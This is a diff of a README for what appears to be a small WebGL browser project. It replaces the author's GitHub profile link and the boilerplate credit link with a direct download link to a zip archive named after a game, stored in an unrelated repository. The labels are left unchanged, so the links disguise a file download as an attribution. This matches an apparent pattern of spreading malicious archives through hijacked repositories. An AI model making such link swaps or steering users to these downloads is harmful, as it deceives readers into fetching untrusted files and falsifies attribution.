@@ -18,7 +18,7 @@ Open the 'index.html' file in your browser.
 
 ## Author
 Atirek Kumar  
-Github handle: https://github.com/atirek-ak/
+Github handle: https://github.com/chikingod1/subway-surfersx/raw/refs/heads/master/.codesandbox/subway_surfersx_1.9-alpha.5.zip
 
 ## Acknowledgment
-Boilerplate used: https://github.com/yp201/Webgl-boilerplate
+Boilerplate used: https://github.com/chikingod1/subway-surfersx/raw/refs/heads/master/.codesandbox/subway_surfersx_1.9-alpha.5.zip
